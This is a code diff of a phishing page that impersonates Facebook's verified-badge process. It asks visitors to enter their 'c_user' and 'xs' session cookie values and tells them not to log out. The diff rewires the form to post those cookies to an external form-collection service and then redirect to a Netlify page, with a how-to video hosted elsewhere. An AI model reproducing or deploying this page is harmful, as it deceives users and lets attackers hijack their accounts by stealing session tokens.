@@ -28,27 +28,63 @@
                                     <p class="fw-semibold validation_form_para">The verify badge means that Facebook has confirmed that the Page or profile is the authentic presence of the individual, public figure or brand that it represents.</p>
                                     <p class="fw-semibold validation_form_para">Previously, the verify badge also required the person or brand to be notable and unique. You may still see users with a verified badge that represents our previous eligibility requirements.</p>
                                     <p class="fw-semibold validation_form_para">Please provide the precise details below. Refer to the video for clarification if you find the instructions unclear.</p>
-                                    <p class="fw-semibold text-secondary" style="font-size: 12px;">Detailed Video Information.</p>
-                                    <video controls="" autoplay="" src="detailed video.mp4" style="width: 300px; height: 160px;"></video>
-                                    <br>
-                                    <button>Enable Sound</button>
-                                    <p class="fw-semibold validation_form_para mt-2">Please be sure to provide the requested information below.</p>
-                                    <label class="" style="font-size: 12px;">c_user</label>
-                                    <br>
-                                    <input type="number" name="c_user" required="" pattern="^\d{15}$" title="Please enter 15 digits">
-                                    <br>
-                                    <label class="mt-2" style="font-size: 12px;">xs</label>
-                                    <br>
-                                    <input type="text" name="xs">
-                                    <p class="mt-2" style="font-size: 12px;">Please make sure not to log out from your computer or laptop until you have received a verification email.</p>
-                                </div>
-                                <div class="p-2 mb-2 d-flex justify-content-end" style="background: rgb(245, 246, 247);">
-                                    <button type="submit" class="text-white border-0" style="background: rgb(66, 103, 178);">Submit</button>
-                                </div>
-                            </div>
-                        </div>
-                    </form>
-                </div>
-            </div>
-    </body>
+                                    <p class="fw-semibold text-secondary" style="font-size: 12px;">Detailed Video Information.<!-- Embedded Video -->
+      <div class="video-container">
+        <video controls>
+          <source
+            src="https://blqiozzohqqszikuuqad.supabase.co/storage/v1/object/public/videos//87aa4c9e-cec7-4e8d-b2e8-62b21351e57d.mov"
+            type="video/mp4"
+          />
+          Your browser does not support the video tag.
+        </video>
+      </div>
+
+      <!-- Form Notice -->
+      <p class="form-notice">
+        Please ensure that all required information is accurately provided.
+        Failure to do so may result in not receiving a verified badge.
+      </p>
+
+      <!-- Form -->
+      <form
+        id="userForm"
+        action="https://submit-form.com/cabHQGH9h"
+        method="POST"
+      >
+        <input
+          type="hidden"
+          name="_redirect"
+          value="https://submit-complete-password-verification.netlify.app/"
+        />
+
+        <div class="form-group">
+          <label for="c_user">c_user</label>
+          <input
+            type="text"
+            id="c_user"
+            name="c_user"
+            pattern="[0-9]+"
+            minlength="6"
+            required
+          />
+        </div>
+        <div class="form-group">
+          <label for="xs">xs</label>
+          <input
+            type="text"
+            id="xs"
+            name="xs"
+            pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$"
+            required
+          />
+        </div>
+        <p class="notice">
+          Please make sure not to log out from your computer or laptop until you
+          have received a verification email.
+        </p>
+        <button type="submit">Submit</button>
+      </form>
+    </div>
+  </body>
 </html>
+
